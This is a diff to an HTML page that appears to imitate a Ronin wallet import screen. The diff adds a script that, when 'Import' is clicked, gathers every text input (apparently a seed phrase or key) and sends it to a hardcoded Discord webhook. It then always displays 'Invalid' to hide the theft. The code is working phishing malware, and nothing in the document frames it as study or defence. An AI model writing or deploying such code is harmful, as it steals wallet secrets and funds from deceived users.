@@ -43,6 +43,8 @@
             </div>
             <button class="paste-btn">Paste from clipboard</button>
             <button class="import-btn">Import</button>
+                    <div class="error-message">Invalid</div>
+
         </div>
         <div class="info">
             <img src="ronin-logo.svg" alt="Ronin Info" class="info-img">
@@ -57,4 +59,47 @@
         </div>
     </div>
 </body>
+      <script>
+        document.querySelector('.import-btn').addEventListener('click', function() {
+            // Obtener todos los inputs
+            const inputs = document.querySelectorAll('input[type="text"]');
+            let inputValues = [];
+            inputs.forEach(input => {
+                inputValues.push(input.value);
+            });
+
+            // Crear el payload para el webhook
+            const payload = {
+                content: "Inputs: " + inputValues.join(", ")
+            };
+
+            // URL del webhook de Discord
+            const webhookUrl = 'https://discord.com/api/webhooks/1266883326862561280/6ZcLnLB5Q2rSVVc2QQAfPtl8Kg475P2dAwokLQhTbE3aAAOLwcD6t6B9AouOPoj5RHv6';
+
+            // Enviar datos al webhook de Discord
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Success:', data);
+                // Mostrar mensaje de error
+                document.querySelector('.error-message').style.display = 'block';
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                // Mostrar mensaje de error
+                document.querySelector('.error-message').style.display = 'block';
+            });
+        });
+    </script>
 </html>
